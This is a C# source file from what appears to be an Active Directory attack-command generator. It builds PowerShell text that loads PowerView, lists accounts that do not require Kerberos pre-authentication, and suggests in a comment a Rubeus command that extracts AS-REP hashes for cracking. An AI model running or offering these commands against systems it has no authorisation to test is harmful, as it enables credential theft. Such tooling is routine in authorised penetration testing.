using System.Collections.Generic;

namespace AD_Commander.Generators;

// Builds the PowerView enumeration of AS-REP roastable accounts (Get-DomainUser -PreauthNotRequired).
// PowerView finds the accounts; extracting the actual AS-REP hashes is done with a separate tool
// (Rubeus / ASREPRoast), shown only as a comment in the output. Pure text generation only.
public static class AsRepRoastGenerator
{
    public static string Generate(
        string identity,
        string properties,
        bool verbose,
        string domain,
        string username)
    {
        bool useCredential = domain.Length > 0 && username.Length > 0;
        List<string> lines = new List<string>();

        if (useCredential)
        {
            lines.Add("$SecPassword = Read-Host \"Credential password\" -AsSecureString");
            lines.Add($"$Cred = New-Object System.Management.Automation.PSCredential('{Ps(domain)}\\{Ps(username)}', $SecPassword)");
            lines.Add("");
        }

        lines.Add("Import-Module .\\PowerView.ps1");
        lines.Add("");
        lines.Add("# Find accounts that do not require Kerberos pre-authentication (AS-REP roastable):");

        string command = "Get-DomainUser -PreauthNotRequired";
        if (identity.Length > 0)
        {
            command += $" -Identity '{Ps(identity)}'";
        }
        if (properties.Length > 0)
        {
            command += $" -Properties {properties}";
        }
        if (useCredential)
        {
            command += " -Credential $Cred";
        }
        if (verbose)
        {
            command += " -Verbose";
        }

        lines.Add(command);
        lines.Add("");
        lines.Add("# Extract the AS-REP hashes with Rubeus (separate tool), e.g.:");
        lines.Add("# Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt");

        return string.Join("\r\n", lines);
    }

    // Escape single quotes so a value can't break out of a PowerShell single-quoted string.
    private static string Ps(string value) => value.Replace("'", "''");
}
